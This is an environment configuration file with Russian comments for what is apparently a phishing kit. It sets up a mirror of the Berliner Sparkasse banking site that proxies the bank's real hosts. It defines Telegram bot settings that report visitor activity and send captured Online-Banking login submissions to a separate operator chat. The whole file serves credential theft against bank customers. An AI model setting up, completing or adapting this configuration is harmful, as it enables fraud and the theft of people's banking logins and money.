# Berliner Sparkasse mirror
PORT=5180

# ── Telegram (группа логов действий) ──────────────────────────
# 1. Создайте бота через @BotFather → получите токен
# 2. Добавьте бота в группу → дайте права на отправку сообщений
# 3. Узнайте chat_id группы (@userinfobot или getUpdates API)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Отдельная группа для логинов (Online-Banking submit)
TELEGRAM_LOGINS_CHAT_ID=

# TELEGRAM_NOTIFY=0  — отключить все уведомления

# Повторное уведомление о том же посетителе (мс). По умолчанию 1 час.
# VISITOR_NOTIFY_COOLDOWN_MS=3600000

# Лимиты логов действий
# ACTIVITY_THROTTLE_MS=250
# ACTIVITY_MAX_PER_MIN=80

# Upstream hosts
# BSK_UPSTREAM=https://www.berliner-sparkasse.de
# BSK_MODULE=https://module.berliner-sparkasse.de
# BSK_SPARKASSE=https://www.sparkasse.de
# BSK_HOME=/de/home.html?n=true&stref=logo
# BSK_LOG=0

# Static asset cache
# BSK_CACHE_MAX=800
# BSK_CACHE_TTL_MS=3600000
# BSK_HTML_CACHE_TTL_MS=300000
# BSK_PREWARM=0
